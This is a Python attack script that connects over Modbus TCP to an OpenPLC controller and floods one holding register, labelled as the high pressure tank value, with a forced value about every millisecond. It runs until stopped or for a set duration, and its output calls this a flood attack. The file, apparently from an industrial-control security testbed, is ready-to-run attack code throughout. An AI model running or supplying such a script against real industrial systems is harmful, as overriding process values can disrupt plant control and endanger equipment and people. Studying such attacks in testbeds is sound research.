#!/usr/bin/env python3
import time
from pymodbus.client import ModbusTcpClient
import os
import sys
import argparse
from dotenv import load_dotenv
from pathlib import Path

# Value of high pressure tank (HPT), which should be flooded
hpt = 10

# Parse command line arguments
parser = argparse.ArgumentParser(description='Flood the high pressure tank (HPT) value on OpenPLC')
parser.add_argument('ip', nargs='?', help='IP address of the OpenPLC device')
parser.add_argument('--duration', '-d', type=int, help='Duration in seconds (default: infinite)', default=None)
parser.add_argument('--value', '-v', type=int, help='HPT value to flood (default: 10)', default=10)
args = parser.parse_args()

hpt = args.value

# Get device IP
if args.ip:
    device_ip = args.ip
    print(f"Using IP from command line: {device_ip}")
else:
    # Use .dev.env file for DEVICE_IP
    dotenv_path = Path('../../.dev.env')
    load_dotenv(dotenv_path=dotenv_path)
    device_ip = os.getenv('DEVICE_IP')
    print(f"Using IP from .dev.env: {device_ip}")

if not device_ip:
    print("Error: No IP address provided. Use: flooding_hpt.py <IP_ADDRESS> [--duration SECONDS]")
    sys.exit(1)

print("This script will flood the value of the high pressure tank (HPT) of the OpenPLC")
print(f"Flooding IP: {device_ip}")
if args.duration:
    print(f"Duration: {args.duration} seconds")
else:
    print("Duration: infinite (until interrupted)")
print(f"HPT value: {hpt}")
time.sleep(2)

# Connect to ModbusTCP of the OpenPLC
client = ModbusTcpClient(host=device_ip,port=502)   # Create client object
client.connect()                 # connect to device, reconnect automatically

# Flooding loop
try:
    start_time = time.time()
    count = 0
    while True:
        # Check duration limit if specified
        if args.duration and (time.time() - start_time) >= args.duration:
            print(f"\nDuration limit reached ({args.duration}s). Stopping flood attack...")
            break

        print(f"Setting HPT to {hpt} (count: {count})")
        client.write_register(1126, hpt) #(register, value, unit)
        count += 1
        time.sleep(0.001)
except KeyboardInterrupt:
    print("\nStopping flood attack...")
finally:
    client.close()                             # Disconnect device
    print(f"Connection closed. Total writes: {count}")
